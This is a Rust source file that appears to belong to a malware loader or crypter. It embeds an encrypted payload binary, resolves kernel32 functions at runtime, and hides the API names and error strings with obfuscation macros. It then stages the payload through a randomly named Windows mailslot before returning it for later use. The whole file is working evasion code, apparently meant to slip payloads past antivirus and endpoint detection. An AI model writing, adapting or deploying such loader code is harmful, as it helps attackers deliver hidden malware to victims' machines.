use std::ffi::{CString, c_void};
use std::thread;
use std::time::Duration;
use rand::Rng;
use std::ptr;
use crate::utils::{load_library, get_proc_address};
use rustcrypt_ct_macros::obf_lit_bytes;

pub fn load_payload() -> Result<Vec<u8>, String> {
    const ENCRYPT_DATA: &'static [u8] = include_bytes!("../../output/encrypt.bin");
    let encrypted_data = ENCRYPT_DATA.to_vec();

    // Generate random mailslot name
    let random: u32 = rand::thread_rng().gen_range(10000..99999);
    let mailslot_name_str = format!("\\\\.\\mailslot\\rsl_slot_{}", random);
    let mailslot_name_c = CString::new(mailslot_name_str.clone()).map_err(|e| e.to_string())?;

    unsafe {
        let kernel32 = load_library(obf_lit_bytes!(b"kernel32.dll\0").as_slice())?;
        
        // Define function types
        type CreateMailslotAFn = unsafe extern "system" fn(*const u8, u32, u32, *const c_void) -> isize;
        type GetMailslotInfoFn = unsafe extern "system" fn(isize, *mut u32, *mut u32, *mut u32, *mut u32) -> i32;
        type CreateFileAFn = unsafe extern "system" fn(*const u8, u32, u32, *const c_void, u32, u32, isize) -> isize;
        type WriteFileFn = unsafe extern "system" fn(isize, *const u8, u32, *mut u32, *mut c_void) -> i32;
        type ReadFileFn = unsafe extern "system" fn(isize, *mut u8, u32, *mut u32, *mut c_void) -> i32;
        type CloseHandleFn = unsafe extern "system" fn(isize) -> i32;

        // Load functions
        let create_mailslot_a: CreateMailslotAFn = std::mem::transmute(get_proc_address(kernel32, obf_lit_bytes!(b"CreateMailslotA\0").as_slice()).map_err(|_| String::from_utf8_lossy(obf_lit_bytes!(b"Failed to load CreateMailslotA\0").as_slice()).to_string())?);
        let get_mailslot_info: GetMailslotInfoFn = std::mem::transmute(get_proc_address(kernel32, obf_lit_bytes!(b"GetMailslotInfo\0").as_slice()).map_err(|_| String::from_utf8_lossy(obf_lit_bytes!(b"Failed to load GetMailslotInfo\0").as_slice()).to_string())?);
        let create_file_a: CreateFileAFn = std::mem::transmute(get_proc_address(kernel32, obf_lit_bytes!(b"CreateFileA\0").as_slice()).map_err(|_| String::from_utf8_lossy(obf_lit_bytes!(b"Failed to load CreateFileA\0").as_slice()).to_string())?);
        let write_file: WriteFileFn = std::mem::transmute(get_proc_address(kernel32, obf_lit_bytes!(b"WriteFile\0").as_slice()).map_err(|_| String::from_utf8_lossy(obf_lit_bytes!(b"Failed to load WriteFile\0").as_slice()).to_string())?);
        let read_file: ReadFileFn = std::mem::transmute(get_proc_address(kernel32, obf_lit_bytes!(b"ReadFile\0").as_slice()).map_err(|_| String::from_utf8_lossy(obf_lit_bytes!(b"Failed to load ReadFile\0").as_slice()).to_string())?);
        let close_handle: CloseHandleFn = std::mem::transmute(get_proc_address(kernel32, obf_lit_bytes!(b"CloseHandle\0").as_slice()).map_err(|_| String::from_utf8_lossy(obf_lit_bytes!(b"Failed to load CloseHandle\0").as_slice()).to_string())?);

        // 1. Create Mailslot (Server)
        let h_slot = create_mailslot_a(
            mailslot_name_c.as_ptr() as *const u8,
            0, // No maximum message size
            0, // No read timeout (we'll poll)
            ptr::null()
        );

        if h_slot == -1 { // INVALID_HANDLE_VALUE
            return Err(String::from_utf8_lossy(obf_lit_bytes!(b"Failed to create mailslot\0").as_slice()).to_string());
        }

        // 2. Spawn Writer Thread (Client)
        let writer_data = encrypted_data.clone();
        let writer_name = mailslot_name_c.clone();
        
        thread::spawn(move || {
            // Give server time to be ready (though CreateMailslot is synchronous)
            thread::sleep(Duration::from_millis(100));

            let h_file = create_file_a(
                writer_name.as_ptr() as *const u8,
                0x40000000, // GENERIC_WRITE
                0x00000001, // FILE_SHARE_READ
                ptr::null(),
                3, // OPEN_EXISTING
                0x00000080, // FILE_ATTRIBUTE_NORMAL
                0
            );

            if h_file != -1 {
                let mut bytes_written = 0;
                
                write_file(
                    h_file,
                    writer_data.as_ptr(),
                    writer_data.len() as u32,
                    &mut bytes_written,
                    ptr::null_mut()
                );
                
                close_handle(h_file);
            }
        });

        // 3. Read from Mailslot (Server)
        let mut buffer = Vec::new();
        let mut total_read = 0;
        let expected_len = encrypted_data.len();
        let mut attempts = 0;
        const MAX_ATTEMPTS: u32 = 100; // 10 seconds timeout

        while total_read < expected_len && attempts < MAX_ATTEMPTS {
            let mut next_size: u32 = 0;
            let mut msg_count: u32 = 0;
            let mut read_timeout: u32 = 0; // We don't care about this output

            let info_success = get_mailslot_info(
                h_slot,
                ptr::null_mut(), // Max message size (don't care)
                &mut next_size,
                &mut msg_count,
                &mut read_timeout
            );

            if info_success != 0 && next_size != 0xFFFFFFFF { // MAILSLOT_NO_MESSAGE
                let mut chunk = vec![0u8; next_size as usize];
                let mut bytes_read = 0;
                
                let read_success = read_file(
                    h_slot,
                    chunk.as_mut_ptr(),
                    next_size,
                    &mut bytes_read,
                    ptr::null_mut()
                );

                if read_success != 0 {
                    buffer.extend_from_slice(&chunk[..bytes_read as usize]);
                    total_read += bytes_read as usize;
                }
            } else {
                thread::sleep(Duration::from_millis(100));
                attempts += 1;
            }
        }

        close_handle(h_slot);

        if total_read == expected_len {
            Ok(buffer)
        } else {
            Err(format!("{} Read: {}, Expected: {}", String::from_utf8_lossy(obf_lit_bytes!(b"Failed to read full payload from mailslot.\0").as_slice()).to_string(), total_read, expected_len))
        }
    }
}
